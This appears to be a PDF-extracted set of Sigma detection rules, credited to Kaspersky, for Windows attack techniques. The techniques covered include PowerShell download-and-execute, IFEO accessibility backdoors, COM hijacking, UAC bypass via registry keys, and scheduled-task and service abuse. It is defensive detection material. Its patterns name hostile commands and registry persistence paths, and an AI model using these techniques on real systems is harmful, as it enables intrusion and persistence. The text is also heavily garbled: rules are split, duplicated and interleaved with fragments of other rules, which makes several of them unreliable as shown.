'plink.exe'\nCommandLine|contains:\n- '-ssh '\n- '-pw '\n- '-R '\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: medium\n\n\ntitle: Remote System\nDiscovery via Standard\nWindows Utilities\n\nid: e6c6d26b-8176-4b3a-806a87c744312976\ndescription: Detects remote\nsystem discovery via standard\nwindows utilities\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.discovery\n- attack.t1018\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith: '\\telnet.exe'\nselection2:\nImage|endswith: '\\arp.exe'\nCommandLine|contains:\n- '/a'\n- '/g'\n- '/v'\n- '-a'\n- '-g'\n- '-v'\nselection3:\nImage|endswith:\n- '\\net1.exe'\n- '\\net.exe'\nCommandLine|contains:\n- 'view'\nselection4:\nImage|endswith: '\\ping.exe'\nCommandLine|contains:\n- '/a'\n- '/n'\n- '/t'\n- '/l'\n- '-a'\n- '-n'\n- '-t'\n- '-l'\nselection5:\nImage|endswith: '\\nbtstat.exe'\nselection6:\nImage|endswith: '\\nltest.exe'\nCommandLine|contains:\n- '/dclist:'\n- '/dsgetdc:'\ncondition: 1 of them\nfalsepositives: Legitimate System\nAdministrator actions\nlevel: low\n\n\n-----\n\ntitle: Sigma-GenericCompress Data for\nExfiltration via Archiver\n\nid: 454fe2d5-c6d3-4258-ae8bd1729859070c\nstatus: stable\ndescription: Adversaries may\nuse utilities to compress and/or\nencrypt collected data prior to\nexfiltration\nmodified: 2023-08-07\ntags:\n- attack.collection\n- attack.T1560.001\nauthor: Kaspersky\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\winrar.exe'\n- '\\rar.exe'\nCommandLine|contains:\n- ' a '\n- ' -r '\n- ' -m'\n- ' -ep'\n- ' -hp'\n- ' -p'\n- ' -ta'\n- ' -tb'\n- ' -sdel'\n- ' -dw'\nselection2:\nImage|endswith:\n- 'winzip.exe'\n- 'winzip64.exe'\nCommandLine|contains:\n- ' -s'\n- ' -min '\n- ' -a '\nselection3:\nImage|endswith:\n- '\\7zip.exe'\n- '\\7z.exe'\n- '\\7za.exe'\n- '\\7z64.exe'\nCommandLine|contains:\n- ' u '\n- ' a '\n- ' -p'\ncondition: 1 of selection*\nfalsepositives:\n- Legitimate System Administrator\nactions\nlevel: low\n\n\ntitle: Generic-PowerShell\nCode Execution from\nRegistry\n\nid: d6c1b57c-f543-40e9-ba048da8e9a7e934\ndescription: Detects reading\nPowerShell code from registry and\nexecuting it\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection_pwsh:\nImage|endswith:\n- 'PowerShell.exe'\n- 'pwsh.exe'\nselection1:\nCommandLine|contains:\n- 'IEX'\n\n\ntitle: Execution of\nDownloaded PowerShell\nCode\n\nid: 1f2dd6bb-61a9-47b8-92c3c6f7c3d89d98\ndescription: Detects downloading\ncontent via PowerShell and further\nits execution\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- 'PowerShell.exe'\n- 'pwsh.exe'\nselection2:\nCommandLine|contains:\n- 'Invoke-WebRequest'\n- 'IWR'\n- 'Invoke-RestMethod'\n\n\n- 'Invoke-Exspression'\n- '[scriptblock]::create('\nselection2:\nCommandLine|contains|all:\n- 'Reflection.Assembly'\n- 'Load'\nselection3:\nCommandLine|contains:\n- '(gp '\n- '(Get-ItemProperty '\ncondition: selection_pwsh and\n((selection1 or selection2) and\nselection3)\nfalsepositives:\n- Unknown\nlevel: medium\n\n\n- 'IRM'\n- 'curl'\n- 'wget'\n- 'Webclient'\n- '.DownloadString('\n- '.DownloadFile('\n- 'Start-BitsTransfer -Source '\nselection3:\nCommandLine|contains:\n- 'IEX'\n- 'Invoke-Expression'\n- 'start-process'\ntimeframe: 5m\ncondition: selection1 and\nselection2 | near selection3\nfalsepositives:\n- Unknown\nlevel: high\n\n\n-----\n\ntitle: Generic-PowerShell\nCode Execution from\nRegistry\n\nid: d6c1b57c-f543-40e9-ba048da8e9a7e934\ndescription: Detects reading\nPowerShell code from registry and\nexecuting it\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection_pwsh:\nImage|endswith:\n- 'PowerShell.exe'\n- 'pwsh.exe'\nselection1:\nCommandLine|contains:\n- 'IEX'\n\n\n- 'Invoke-Exspression'\n- '[scriptblock]::create('\nselection2:\nCommandLine|contains|all:\n- 'Reflection.Assembly'\n- 'Load'\nselection3:\nCommandLine|contains:\n- '(gp '\n- '(Get-ItemProperty '\ncondition: selection_pwsh and\n((selection1 or selection2) and\nselection3)\nfalsepositives:\n- Unknown\nlevel: medium\n\n\ntitle: PowerShell Suspicious\nArguments\n\nid: 80fb8527-baaf-4146-b8daa891b9ca9962\ndescription: Adversaries Often\nuse Suspicious Arguments in\nPowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- 'PowerShell.exe'\n- 'pwsh.exe'\nCommandLine|re:\n- '(?i)-W\\w{0,10}\\sH\\w{0,5}\\s'\n- '(?i)-noni\\w{0,10}\\s'\nselection2:\nImage|endswith:\n- 'PowerShell.exe'\n\n\n- 'pwsh.exe'\nCommandLine|contains:\n- 'Invoke-CimMethod'\n- 'Reflection.Assembly'\n- 'Runtime.InteropServices.\nDllImportAttribute'\n- 'SuspendThread'\n- 'IEX'\n- 'Invoke-Expression'\ncondition: selection1 or selection2\nfalsepositives: unknown\nlevel: high\n\n\ntitle: Suspicious Command\nwmic.exe\n\nid: d22b9feb-efc6-468e-8dd40111e4714459\ndescription: Adversaries use wmic\nfor different purpose like later\nmovement, discovery e.t.c\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.execution\n- attack.t1047\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\wmic.exe'\nselection2:\nCommandLine|contains|all:\n- '/node:'\nselection3:\nCommandLine|contains:\n- '/format:'\nselection4:\nCommandLine|contains:\n- '/Format:List'\n- '/Format:htable'\n- '/Format:hform'\n- '/Format:table'\n- '/Format:mof'\n- '/Format:value'\n- '/Format:rawxml'\n- '/Format:xml'\n- '/Format:csv'\nselection5:\nCommandLine|contains|all:\n- 'call'\n- 'create'\nselection6:\nCommandLine|contains|all:\n- 'call'\n- 'uninstall'\ncondition: (selection1 and\nselection2) or (selection1 and\nselection3 and not selection4)\nor (selection1 and selection4) or\n(selection1 and selection5) or\n(selection1 and selection6)\nfalsepositives: unknown\nlevel: medium\n\n\n-----\n\ntitle: Permission Local\nGroups Discovery via wmic\n\nid: 754ba712-a090-45b2-946d1b2735062b57\ndescription: Detects attempt to\nDiscovery Permission Local Groups\nvia wmic\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1069.001\n- attack.t1047\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\wmic.exe'\nCommandLine|contains|all:\n- 'group'\n- 'get'\n- 'name'\ncondition: selection\nfalsepositives: unknown\nlevel: low\n\n\ntitle: Suspicious Child\nProcess Wmiprvse.exe\n\nid: ec8d56bb-1212-452b-84f438d5f34343f1\ndescription: Illegal child wmiprvse.\nexe the sign of horizontal\nmovement through WMI\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Execution\n- attack.T1047\nlogsource:\n\n\ntitle: Changing MOF SelfInstall Directory via Registry\n\nid: 51816a51-4f38-40d4-b6490248a71708d8\ndescription: Detects changing MOF\nself-install directory via registry\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1546.003\n- attack.defense_evasion\n\n\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nParent_Image|contains:\n- '\\WmiPrvSe.exe'\nselection2:\nImage|contains:\n- '\\WmiPrvSe.exe'\n- '\\WerFault.exe'\n- '\\DismHost.exe'\ncondition: selection1 and not\nselection2\nfalsepositives: unknown\nlevel: high\n\n\n- attack.t1112\nlogsource:\nproduct: windows\ncategory: registry_set\ndetection:\nselection:\nEventType: SetValue\nTargetObject|contains: 'HKLM\\\nSOFTWARE\\Microsoft\\WBEM\\\nCIMOM'\nDetails|contains: 'MOF Self-Install\nDirectory'\ncondition: selection\nfalsepositives: legit software\nlevel: high\n\n\ntitle: MOF file changing/\ncreation\n\nid: 2a48d632-4a96-469d-9fadc84b79f82188\ndescription: Detects changes/\ncreation of a MOF file\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1546.003\nlogsource:\nproduct: windows\ncategory: file_event\n\n\ndetection:\nselection:\nEventID: 11\nTargetFilename|contains|all:\n- '\\system32\\wbem\\mof\\'\n- '.mof'\nfilter:\nImage|contains:\n- '\\Program Files (x86)\\\nsearchinformagent\\sifiltersvc1\\\nsifiltersvc.exe'\ncondition: selection and not filter\nfalsepositives: legit software\nlevel: high\n\n\n-----\n\ntitle: Security Software\nDiscovery via wmic\n\nid: 083d17ef-b38f-48fd-9a0225ead1b77ad6\ndescription: Detects Security\nSoftware Discovery via wmic\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1518.001\n- attack.t1047\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\wmic.exe'\nCommandLine|contains:\n- 'SecurityCenter'\n- 'AntiVirusProduct'\n- 'FirewallProduct'\n\n\nfilter:\nParentImage|contains:\n- '\\program files\\jetbrains\\'\n- '\\pycharm ce\\bin\\'\n- '\\appdata\\local\\jetbrains\\'\n- '\\meraki\\'\n- '\\programdata\\centrastage\\\naemagent\\'\ncondition: selection and not filter\nfalsepositives: Administator activity\nor legit software\nlevel: medium\n\n\ntitle: Not Standard Parent\nProcess Bitsadmin\n\nid: 17ca42e9-76c6-453a-a1eaa4f4afea534d\ndescription: Detects attempts to\ngain a persistence in the system\nthrough Silent Process Exit\nMonitoring\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.persistence\n- attack.execution\n- attack.t1546.012\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: ps_script\ndefinition: Script Block Logging\nmust be enable\ndetection:\nselection1:\nScriptBlockText|contains:\n- 'set-itemproperty'\n- ' sp '\n- 'Move-ItemProperty'\n- ' mp '\n- 'Copy-ItemProperty'\n- ' cpp '\n- 'Rename-ItemProperty'\n- ' rnp '\n- 'Copy-Item'\n- ' copy '\n- ' cp '\n- ' cpi '\n- 'Rename-Item'\n- ' ren '\n- ' rni '\n- 'New-Item'\n- ' md '\n- ' ni '\n- 'Move-Item'\n- ' move '\n- ' mv '\n- ' mi '\n- 'Set-Item'\n- ' si '\nselection2:\nScriptBlockText|contains|all:\n-'SilentProcessExit'\n-'MonitorProcess'\ncondition: selection1 and\nselection2\nfalsepositives: unknown\nlevel: high\n\n\ntitle: Persistence by Image\nFile Execution Options via\nRegistry\n\ntitle: Persistence by Image File\nExecution Options via Registry\nid: fc213fc0-7ce7-4d8c-8bf430f3365db732\ndescription: Persistence by Image\nFile Execution Options via Registry\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1546.012\n- attack.defense_evasion\n- attack.t1112\nlogsource:\nproduct: windows\ncategory: registry_set\ndetection:\nselection:\nTargetObject|contains:\n-'\\Microsoft\\Windows NT\\\nCurrentVersion\\Image File\nExecution Options\\'\n\n\nTargetObject|endswith:\n-'\\Debugger'\ncondition: selection\nfalsepositives:\n- Legitimate software\nlevel: high\n\n\n-----\n\ntitle: Accessibility Features\nBackdoor Installation via ifeo\ndebugger\n\nid: 19ab2de3-7388-4963-9624ea2d102973b3\ndescription: Debbuger installation\nfor system accessibility features\nusing Image File Execution Options\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.execution\n- attack.defense_evasion\n- attack.t1546.008\n- attack.t1546.012\n- attack.T1059.001\n- attack.t1112\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- 'reg.exe'\n- 'PowerShell.exe'\n- 'pwsh.exe'\n- 'PowerShell_ise.exe'\nCommandLine|contains|:\n- 'set-itemproperty'\n- ' sp '\n- 'new-itemproperty'\n- 'add'\nselection2:\nCommandLine|contains|all:\n-'\\Image File Execution Options\\'\n-'Debugger'\nselection3:\nCommandLine|contains:\n-'sethc'\n-'utilman'\n-'magnify'\n-'atbroker'\n-'displayswitch'\n-'osk'\n-'narrator'\ncondition: selection1 and\nselection2 and selection3\nfalsepositives: unknown\nlevel: high\n\n\ntitle: Not Standard Parent\nProcess Bitsadmin\n\nid: 2f0ca900-31d1-44b7-ac52f35c8fb6c9cc\ndescription: Detects suspicious\nparent process of Bitsadmin\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-25\ntags:\n- attack.defense_evasion\n- attack.persistence\n- attack.t1197\nlogsource:\n\n\ntitle: Image File Execution\nOptions Injection via\nSilentProcessExit\n\nid: b2e6275e-2719-45ce-b28a71ce5e3eef97\ndescription: Detects attempts to\ngain a persistence in the system\nthrough Silent Process Exit\nMonitoring via registry\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n- attack.defense_evasion\n- attack.t1546.012\n\n\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- 'bitsadmin.exe'\nselection2:\nParentImage|endswith:\n- 'cmd.exe'\ncondition: selection1 and not\nselection2\nfalsepositives: unknown\nlevel: medium\n\n\n- attack.t1112\nlogsource:\nproduct: windows\ncategory: registry_event\ndetection:\nselection:\nEventType: SetValue\nTargetObject|constains:\n- '\\SOFTWARE\\Microsoft\\\nWindows NT\\CurrentVersion\\\nSilentProcessExit'\nTargetObject|endswith:\n- 'MonitorProcess'\n- 'ReportingMode'\ncondition: selection\nfalsepositives: unknown\nlevel: high\n\n\ntitle: COM Hijacking via\nDelegateExecute\n\nid: a6450968-2519-428d-ba3d10fd3116f852\ndescription: Detects UAC bypass\ntechnique via modification of\nthe ms-settings\\Shell\\Open\\\ncommand\\DelegateExecute\nregistry value\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n\n\n- attack.privilege_escalation\n- attack.t1546.015\n- attack.t1548.002\nlogsource:\ncategory: registry_set\nproduct: windows\ndetection:\nselection:\nEventType: SetValue\nTargetObject|contains:\n- '\\ms-settings\\Shell\\Open\\\ncommand\\DelegateExecute'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\n-----\n\ntitle: Accessibility Features\nBackdoor Installation via\nSilentProcessExit Monitoring\n\nid: fce8d876-91d0-4d38-b007456a422d777e\ndescription: Detects gain\npersistence attempts via\ninstallation monitoring application\nsystem application for system\nAccessibility Features\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.execution\n- attack.defense_evasion\n- attack.t1546.008\n- attack.T1059.001\n- attack.t1112\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- 'reg.exe'\n- 'PowerShell.exe'\n- 'pwsh.exe'\n- 'PowerShell_ise.exe'\nCommandLine|contains|:\n- 'add'\n\n\n- 'set-itemproperty'\n- ' sp '\n- 'new-itemproperty'\nselection2:\nCommandLine|contains|all:\n-'\\WindowsNT\\CurrentVersion\\\nSilentProcessExit'\n-'MonitorProcess'\nselection3:\nCommandLine|contains:\n-'utilman'\n-'displayswitch'\n-'narrator'\n-'sethc'\n-'osk'\n-'atbroker'\n-'magnify'\ncondition: selection1 and\nselection2 and selection3\nfalsepositives: unknown\nlevel: high\n\n\ntitle: Application Verifier\nPersistance via PowerShell\n\nid: c601e4ea-6ffa-4777-ad232f5440c1fa95\ndescription: Detects attempts to\ngain a persistence in the system\nthrough the IFEO (Image File\nExecution Options) application\nverifier.\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.persistence\n- attack.execution\n- attack.t1546.012\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: ps_script\ndefinition: Script Block Logging\nmust be enable\ndetection:\nselection1:\nScriptBlockText|contains:\n- 'Set-Itemproperty'\n- ' sp '\n- 'New-Itemproperty'\n- 'Move-ItemProperty'\n- ' mp '\n- 'Copy-ItemProperty'\n- ' cpp '\n- 'Rename-ItemProperty'\n- ' rnp '\n- 'Copy-Item'\n- ' copy '\n- ' cp '\n- ' cpi '\n- 'Rename-Item'\n- ' ren '\n- ' rni '\n- 'New-Item'\n- ' md '\n- ' ni '\n- 'Move-Item'\n- ' move '\n- ' mv '\n- ' mi '\n- 'Set-Item'\n- ' si '\nselection2:\nScriptBlockText|contains|all:\n-'Image File Execution Options'\n-'verifierdlls'\ncondition: selection1 and\nselection2\nfalsepositives: unknown\nlevel: high\n\n\ntitle: COM Hijacking via\nmscfile\n\nid: feadcf16-46ba-4bf3-8bb64f5db99fd351\ndescription: Detects UAC bypass\ntechnique via modification of the\nmscfile\\Shell\\Open\\command\nregistry key\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1546.015\n- attack.t1548\nlogsource:\ncategory: registry_set\nproduct: windows\n\n\ndetection:\nselection:\nEventType: SetValue\nTargetObject|contains:\n- '\\mscfile\\Shell\\Open\\\ncommand'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\n-----\n\ntitle: Discovery Component\nObject Model Keys via\nPowerShell\n\nid: ba363a93-e060-49d4-a1c539dd63133d05\ndescription: Detects COM keys\ndiscovery via PowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1546.015\n- attack.execution\n- attack.t1059.001\n- attack.discovery\n- attack.t1518.001\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith:\n- 'pwsh.exe'\n- 'PowerShell.exe'\n- 'PowerShell_ise.exe'\n- 'syncappvpublishingserver.exe'\nselection2:\nCommandLine|contains:\n- 'InprocServer32'\n- 'LocalServer32'\nselection3:\nCommandLine|contains:\n- 'gwmi Win32_COMSetting'\n- 'Get-WmiObject Win32_\nCOMSetting'\ncondition: selection1 and\nselection2 and selection3\nfalsepositives:\n- Unknown\nlevel: medium\n\n\ntitle: Component Object\nModel Hijacking via Sdclt\n\nid: ccbf62e2-36e1-4bf1-8ec65c8d3db0cae4\ndescription: Detects COM hijacking\nvia sdclt\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1546.015\n- attack.t1548.002\n- attack.defense_evasion\n\n\n- attack.t1112\nlogsource:\ncategory: registry_set\nproduct: windows\ndetection:\nselection:\nEventType: SetValue\nTargetObject|contains:\n- '\\Software\\Classes\\exefile\\\nshell\\runas\\command\\'\nDetails|contains:\n- 'isolatedCommand'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: COM Hijacking via\nDelegateExecute\n\nid: a6450968-2519-428d-ba3d10fd3116f852\ndescription: Detects UAC bypass\ntechnique via modification of\nthe ms-settings\\Shell\\Open\\\ncommand\\DelegateExecute\nregistry value\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n\n\n- attack.privilege_escalation\n- attack.t1546.015\n- attack.t1548.002\nlogsource:\ncategory: registry_set\nproduct: windows\ndetection:\nselection:\nEventType: SetValue\nTargetObject|contains:\n- '\\ms-settings\\Shell\\Open\\\ncommand\\DelegateExecute'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: Windows Service\nCreation or Modification via\nsc.exe\n\nid: 8c9080ee-f638-4fee-9dffeb7874224e92\ndescription: detects service\ncreation or modification via sc.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1543.003\nlogsource:\nproduct: windows\n\n\ncategory: process_creation\ndetection:\nselection:\nImage|endswith: '\\sc.exe'\nCommandline|contains:\n'binpath='\ncondition: selection\nfalsepositives:\n- Legitimate Software: EAA\nClient, HP Touchpoint Analytics,\ne.t.c\nlevel: medium\n\n\n-----\n\ntitle: Component Object\nModel Hijacking via TreatAs\n\nid: 747ba6ce-0036-45ae-b10205cae4ba60ab\ndescription: Detects component\nobject model hijacking via treatas\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1546.015\n- attack.defense_evasion\n- attack.t1112\nlogsource:\ncategory: registry_set\nproduct: windows\ndetection:\nselection:\nEventType: SetValue\nTargetObject|contains:\n- 'Classes\\CLSID\\\nTargetObject|endswith:\n- '\\TreatAs'\n\n\n- '\\ScriptletURL'\nfilter_1:\nImage|contains:\n- 'program files\\common files\\\nmicrosoft shared\\clicktorun\\\nupdates\\'\nImage|endswith:\n- '\\officeclicktorun.exe'\nfilter_2:\nImage|contains:\n- 'windows\\winsxs\\\namd64_microsoft-windowsservicingstack_'\nImage|endswith:\n- '\\tiworker.exe'\ncondition: selection and not filter_*\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: Component Object\nModel Hijacking via\nPowerShell\n\nid: 7e5d7fd2-a0fb-4d59-b3cc83cac6050f73\ndescription: Detects component\nobject model hijacking via\nPowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1546.015\n- attack.execution\n- attack.t1059.001\nlogsource:\ncategory: process_creation\nproduct: windows\ndetection:\nselection1:\nImage|endswith:\n- 'pwsh.exe'\n- 'PowerShell.exe'\n- 'PowerShell_ise.exe'\n- 'syncappvpublishingserver.exe'\nselection2:\nCommandLine|contains|all:\n- 'GetTypeFromCLSID'\n- 'ShellExecute'\nselection3:\nCommandLine|contains|all:\n- 'CreateInstance'\n- 'ShellExecute'\nselection4:\nCommandLine|contains|all:\n- 'CreateInstance'\n- 'GetTypeFromCLSID'\ncondition: selection1 and (\nselection2 or selection3 or\nselection4 )\nfalsepositives:\n- Unknown\nlevel: medium\n\n\ntitle: Suspicious Schtasks.\nexe Arguments\n\nid: 057de58f-0f70-4c41-bacc9d0a41d0571b\ndescription: Detects suspicious\nschtasks.exe arguments\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.execution\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1053.005\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\schtasks.exe'\nCommandLine|contains:\n- '/create '\n- '/change '\nselection2:\nCommandLine|contains:\n- ' shutdown '\n\n\n- '/s '\n- '/u '\n- ' recycle '\nselection3:\nCommandLine|re:\n- '(?i)\\/ru .*?system'\ncondition: selection1 and\n(selection2 or selection3)\nfalsepositives:\n- legitimate software\n- system administrator actions\nlevel: medium\n\n\n-----\n\ntitle: Windows Shell Started\nSchtasks\n\nid: 14a2fc24-1b8b-4e47-9fc3145148875a23\ndescription: Suspicious parent\nprocess schtasks\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.Execution\n- attack.Persistence\n- attack.Privilege Escalation\n- attack.T1053.005\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\schtasks.exe'\nParentImage|endswith:\n- '\\PowerShell_ise.exe'\n- '\\cmstp.exe'\n- '\\appvlp.exe'\n- '\\mftrace.exe'\n- '\\scriptrunner.exe'\n- '\\forfiles.exe'\n- '\\msiexec.exe'\n- '\\rundll32.exe'\n- '\\mshta.exe'\n- '\\hh.exe'\n- '\\wmic.exe'\n- '\\regsvr32.exe'\n- '\\scrcons.exe'\n- '\\bash.exe'\n- '\\sh.exe'\n- '\\cscript.exe'\n- '\\wscript.exe'\n- '\\PowerShell.exe'\n- '\\cmd.exe'\ncondition: selection\nfalsepositives: Legitimate System\nAdministrator actions\nlevel: medium\n\n\ntitle: Suspicious Schtasks.\nexe Arguments\n\nid: 057de58f-0f70-4c41-bacc9d0a41d0571b\ndescription: Detects suspicious\nschtasks.exe arguments\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.execution\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1053.005\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\schtasks.exe'\nCommandLine|contains:\n- '/create '\n- '/change '\nselection2:\n\n\ntitle: Scheduled Task Start\nfrom Public Directory\n\nid: 61f91069-ad33-41d8-81d7abe0a5145c10\ndescription: Adversaries often\ncreate Scheduled Task with sample\nin Public Directory\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.execution\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1053.005\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|contains:\n- '\\schtasks.exe'\nCommandline|contains:\n- '\\ProgramData\\'\n- '\\Users\\'\n- '\\Public\\'\n- '\\AppData\\'\n\n\nCommandLine|contains:\n- ' shutdown '\n- '/s '\n- '/u '\n- ' recycle '\nselection3:\nCommandLine|re:\n- '(?i)\\/ru .*?system'\ncondition: selection1 and\n(selection2 or selection3)\nfalsepositives:\n- legitimate software\n- system administrator actions\nlevel: medium\n\n\n- '\\Desktop\\'\n- '\\Downloads\\'\n- '\\Temp\\'\n- '\\Tasks\\'\n- '\\$Recycle'\ncondition: selection\nfalsepositives: Unknown\nlevel: medium\n\n\n-----\n\ntitle: Remote Windows\nService Creation or\nModification via sc.exe\n\nid: cd776ded-2a95-4fcd-bf1fade3bfe534cd\ndescription: detects remote service\ncreation or modification via sc.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1543.003\n\n\n- attack.lateral_movement\n- attack.t1021\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith: '\\sc.exe'\nCommandline|contains|all:\n- '\\\\'\n- 'binpath='\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: Windows Service\nCreation or Modification via\nPowerShell.exe\n\nid: 3ed6ad87-9e69-4e5e-89128006e47779c2\ndescription: detects service\ncreation or modification via\nPowerShell.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.t1543.003\n- attack.execution\n- attack.t1059.001\n\n\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\PowerShell.exe'\n- '\\pwsh.exe'\nCommandline|contains:\n'-BinaryPathName'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: Generic-service\nmanipulations via net.exe\n\nid: 732d6166-9815-4bde-9000ed6b00aebb9b\ndescription: detects interaction\nwith services via net.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.persistence\n- attack.t1543.003\nlogsource:\nproduct: windows\n\n\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\net.exe'\n- '\\net1.exe'\nCommandLine|contains|all:\n- ' start '\n- ' stop '\n- ' pause '\n- ' continue '\ncondition: selection\nfalsepositives:\n- unknown\nlevel: low\n\n\ntitle: Windows Shell Start by\nWeb Applications\n\nid: e6b90695-4adc-4b61-b7b6db07989310b9\ndescription: Detects windows\nshell start by web applications,\nmay indicate web application\nexploitation\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.initial_access\n- attack.t1190\n- attack.execution\n- attack.t1059\n- attack.persistence\n- attack.t1505.003\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nParentImage|contains:\n- '\\php-cgi.exe'\n- '\\nginx.exe '\n- '\\w3wp.exe'\n- '\\httpd.exe'\n- '\\tomcat'\n- '\\apache'\nImage|endswith:\n- '\\mshta.exe'\n- '\\wscript.exe'\n- '\\mftrace.exe'\n- '\\PowerShell.exe'\n- '\\PowerShell_ise.exe'\n- '\\scriptrunner.exe'\n- '\\cmd.exe'\n- '\\forfiles.exe'\n- '\\msiexec.exe'\n- '\\rundll32.exe'\n- '\\wmic.exe'\n- '\\hh.exe'\n- '\\regsvr32.exe'\n- '\\schtasks.exe'\n- '\\scrcons.exe'\n- '\\bash.exe'\n- '\\sh.exe'\n- '\\cscript.exe'\nfilter:\nCommandLine|contains:\n- 'rotatelogs'\ncondition: selection and not filter\nfalsepositives:\n- Unknown\nlevel: high\n\n\n-----\n\ntitle: Generic-Windows\nService Creation from\nnon‑system directory via\nRegistry\n\nid: 3f2ae646-0364-40fe-85ef6e587204ebd8\ndescription: Detects service\ncreation from non-system directory\nvia registry\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-10\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- 